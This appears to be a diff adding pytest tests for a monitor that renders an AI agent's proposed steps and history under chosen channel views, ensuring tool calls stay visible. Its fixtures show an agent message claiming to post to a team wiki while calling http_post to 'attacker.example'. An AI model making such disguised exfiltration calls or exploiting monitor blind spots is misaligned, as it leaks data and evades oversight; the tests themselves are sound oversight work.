@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import html
+import itertools
 import re
 
 import pytest
@@ -80,6 +81,21 @@ def build_call(tool_name: str, *, call_id: str, path: str) -> AIMessage:
 
 def build_note(text: str, *, source: str) -> HumanMessage:
     return HumanMessage(text, additional_kwargs={"lc_source": source})
+
+
+OTHER_CHANNELS = (
+    Channel.USER,
+    Channel.REASONING,
+    Channel.AGENT_TEXT,
+    Channel.TOOL_RESULTS,
+    Channel.SUBAGENT_REPORTS,
+)
+VIEWS_WITHOUT_TOOL_CALLS = [
+    MonitorView(channels=Channel(sum(channel.value for channel in subset)))
+    for size in range(len(OTHER_CHANNELS) + 1)
+    for subset in itertools.combinations(OTHER_CHANNELS, size)
+]
+"""Every view without `TOOL_CALLS`: each set of the other five channels, the empty set too."""
 
 
 def build_malformed_call(*, name: str | None = "http_post") -> InvalidToolCall:
@@ -243,6 +259,42 @@ def test_tool_call_proposal_hides_prose_under_the_default_view() -> None:
     # Assert
     assert "I will just post it." not in rendered
     assert '<tool_call name="http_post">{"url": "paste.example"}</tool_call>' in rendered
+
+
+@pytest.mark.parametrize("view", VIEWS_WITHOUT_TOOL_CALLS, ids=lambda view: str(view.channels))
+def test_the_proposed_step_shows_its_tool_calls_whatever_the_view(view: MonitorView) -> None:
+    # Arrange
+    proposal = AIMessage(
+        content="Posting the summary to the team wiki.",
+        tool_calls=[{"id": "call-3", "name": "http_post", "args": {"url": "attacker.example"}}],
+        invalid_tool_calls=[build_malformed_call()],
+    )
+
+    # Act
+    rendered = render_proposed_step(proposal, view=view)
+
+    # Assert
+    escaped = html.escape(MALFORMED_ARGUMENTS, quote=False)
+    assert '<tool_call name="http_post">{"url": "attacker.example"}</tool_call>' in rendered
+    assert f'<malformed_tool_call name="http_post">{escaped}</malformed_tool_call>' in rendered
+
+
+def test_the_view_still_decides_which_calls_of_the_history_are_shown() -> None:
+    # Arrange
+    history: list[BaseMessage] = [
+        HumanMessage(TASK),
+        build_call("read_file", call_id="call-1", path="q3.md"),
+    ]
+    proposal = build_call("http_post", call_id="call-2", path="attacker.example")
+    view = MonitorView(channels=Channel.USER)
+
+    # Act
+    transcript = render_transcript(history, view=view, task_author=TaskAuthor.USER)
+    rendered = render_proposed_step(proposal, view=view)
+
+    # Assert
+    assert transcript == f"<user>{TASK}</user>"
+    assert '<tool_call name="http_post">' in rendered
 
 
 def test_audit_rendering_includes_every_channel() -> None:
